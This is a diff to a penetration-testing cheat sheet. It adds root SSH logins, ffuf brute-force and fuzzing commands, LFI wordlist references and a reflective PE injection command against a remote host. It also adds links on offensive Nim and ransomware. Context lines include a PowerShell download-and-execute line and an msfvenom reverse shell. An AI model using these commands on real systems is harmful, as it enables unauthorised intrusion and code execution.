@@ -15,6 +15,9 @@ wget -m --no-passive ftp://anonymous:anonymous@10.10.10.10
 ### 22 (SSH)
 
 ```bash
+# Commands
+ssh root@10.10.10.10
+ssh root@10.10.10.10 -i id_rsa
 
 ```
 
@@ -254,6 +257,9 @@ nmap -p 3389 --script=rdp-vuln-* 10.10.10.10
 # Commands
 xfreerdp /u:nik /p:'Password@123!' /cert:ignore /v:10.10.10.10
 xfreerdp /u:admin /p:password /cert:ignore /v:10.10.10.10 /drive:share_mount,/opt/folder_to_mount
+
+# References
+- https://www.n00py.io/2021/05/dumping-plaintext-rdp-credentials-from-svchost-exe/
 ```
 
 ### 3632 (DISTCC)
@@ -427,7 +433,10 @@ ffuf -u 'http://10.10.10.10/login.php' -w user.txt:FUZZ -w pass.txt:FUZ2Z -X POS
 ffuf -u 'http:/10.10.10.10/login.php' -w user.txt:FUZZ -w pass.txt:FUZ2Z -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "user=FUZZ&pass=FUZ2Z"
 
 # With Cookie
+ffuf -u "http://10.10.10.10/FUZZ" -w common.txt:FUZZ -t 1 -b "cookie1=asdasdasd;cookie2=asdasdasd"
 
+# Timeout
+ffuf -u "http://10.10.10.10/FUZZ" -w common.txtt:FUZZ -e .txt,.html -t 1 -timeout 40 -fs 200
 
 # With proxy
 ffuf -u 'http://10.10.10.10/FUZZ' -w common.txt:FUZZ -t 30 -e .php,.html,.txt -x http://10.10.10.10:3128
@@ -488,6 +497,9 @@ C:/windows/debug/NetSetup.log
 C:/windows/debug/mrt.log
 C:/windows/system32/inetsrv/config/schema/ASPNET_schema.xml
 
+# Refrences (Windows Wordlists)
+- https://github.com/random-robbie/bruteforce-lists/blob/master/windows-lfi.txt
+
 # ASP.Net 
 ../../web.config
 ../../Images/image.jpg
@@ -507,15 +519,23 @@ C:/windows/system32/inetsrv/config/schema/ASPNET_schema.xml
 ../../Viwws/Home/Index.ascx
 ../../bin/<namespace found>.dll
 
+# Grep Use in web.config
+grep -Ri namespace | grep -v namespaces | cut -d'"' -f 1-2
+grep -Ri assemblyidentity | cut -d'"' -f 1-2
+grep -ri " type=" | grep -v compiler | cut -d'"' -f 1-4
 
-# References
+# References (ASP.Net)
 - https://digi.ninja/blog/when_all_you_can_do_is_read.php
 - https://www.c-sharpcorner.com/UploadFile/3d39b4/folder-structure-of-Asp-Net-mvc-project/
+- https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html
+- https://raw.githubusercontent.com/xajkep/wordlists/master/discovery/asp_files_only.txt
+- http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html
 ```
 
 ### ASP.NET MVC Folder Structure
 
 ```bash
+# ASP.NET MVC Folder Structure
 MyFirstProject
 - Properties
 	- AssemblyInfo.cs
@@ -548,6 +568,13 @@ MyFirstProject
 # References
 - https://www.tutorialsteacher.com/mvc/mvc-folder-structure
 - https://github.com/DLarsen/Learn-ASP.NET-MVC
+```
+
+### Checklists
+
+```
+# .Net Website Security Guidelines Checklists
+https://www.codeguru.com/columns/kate/.net-website-security-guidelines-checklist.html
 ```
 
 ### Remote Command Execution (RCE)
@@ -657,6 +684,18 @@ Invoke-PrivescCheck
 
 # Directly
 IEX(IWR http://10.10.10.10/PrivescCheck.ps1 -UseBasicParsing); Invoke-PrivescCheck
+```
+
+### Invoke-ReflectivePEInjection
+
+```bash
+# Downloads
+https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1
+
+# Commands
+$c = "C:/patho/execute.dll"
+$PEBytes = [IO.File]::ReadAllBytes($c)
+Invoke-ReflectivePEInjection -PEBytes $PEBytes -FuncReturnType WString -ComputerName Target.local
 ```
 
 ### Windows-Exploit-Suggester 
@@ -1302,11 +1341,100 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=eth0 LPORT=443 -f base64
 
 ```
 
-### OffensiveNim
+### GhostWriter 
+
+```bash
+# Download
+https://github.com/GhostManager/Ghostwriter
+
+#=====Take Substring=====
+{{ finding.title[1:6] }}
+{{ finding.title[1:-1] }}
+{{ finding.title[1:] }}
+
+#=====Set List=====
+{% set list_web = ['WEB01','WEB02'] %} 
+
+#=====Example(1) Iteration=====
+{% for x in inputs %}
+	{{ x }}
+{% endfor %}
+
+#=====Example(1) IfElse=====
+{% if 'web' in x %}
+	yes
+{% endif %}
+
+#====Inside findings====
+# https://github.com/GhostManager/Ghostwriter/blob/ee24eb299c0e66b6b718eb3ecf5f084685b526f0/ghostwriter/reporting/models.py
+{% for findings in findings %}
+	{{ finding.title }}
+	{{ finding.position }}
+	{{ finding.affected_entities }}
+	{{ finding.description }}
+	{{ finding.impact }}
+	{{ finding.mitigation }}
+	{{ finding.replication_steps }}
+	{{ finding.host_detection }}
+	{{ finding.network_detection }}
+	{{ finding.references }}
+	{{ finding.finding_guidance }}
+	{{ finding.complete }}
+	# Foreign Keys
+	{{ finding.severity }}
+	{{ finding.finding_type }}
+	{{ finding.report }}
+{% endfor % }
+
+#====Inside target====
+# https://github.com/GhostManager/Ghostwriter/blob/ee24eb299c0e66b6b718eb3ecf5f084685b526f0/ghostwriter/rolodex/models.py
+{% for targets in target %}
+	{{ targets.ip_address }}
+	{{ targets.hostname }}
+	{{ targets.note }}
+	{{ targets.compromised }}
+	# Foreign Keys
+	{{ targets.project }}
+{% endfor % }
 
 ```
+
+### Nim
+
+```
+# Download
+https://nim-lang.org/
+
+# Commands
+nim c .\practice.nim
+
+# Variables
+var age: int
+var ageSpecified: int = 25
+var variableImplicit = "Hello"
+
+var my_variable != var My_variable
+var my_variable == var myVariable
+
+# Function
+## Void
+proc header(): void =
+	echo "here"
+
+# Output
+echo "Age: ", ageSpecified
+
+# Install (Nimble)
+nimble install winim
+
 # References
 https://github.com/byt3bl33d3r/OffensiveNim
+https://blog.eduonix.com/web-programming-tutorials/nim-programming-language-syntaxes/
+https://ajpc500.github.io/nim/Shellcode-Injection-using-Nim-and-Syscalls/
+https://github.com/ajpc500/NimlineWhispers
+https://gist.github.com/ChoiSG/e0a7f5949638dfe363bcd418d94dcc34
+https://ilankalendarov.github.io/posts/nim-ransomware/
+https://s3cur3th1ssh1t.github.io/Playing-with-OffensiveNim/
 ```
 
 ### Bypass 403 (Forbidden)
@@ -2151,6 +2279,15 @@ set rhosts 10.10.10.10
 
 # References
 - https://bond-o.medium.com/sambacry-rce-cve-2017-7494-41c3dcc0b7ae
+```
+
+### Microsoft Exchange Server RCE (CVE-2021-26855)
+
+```bash
+# References
+- https://motasem-notes.net/how-to-test-if-your-exchange-server-is-compromised-and-vulnerable/
+- https://github.com/microsoft/CSS-Exchange/tree/main/Security
+- https://www.picussecurity.com/resource/blog/ttps-hafnium-microsoft-exchange-servers
 ```
 
 # E. CMS/Web/Application
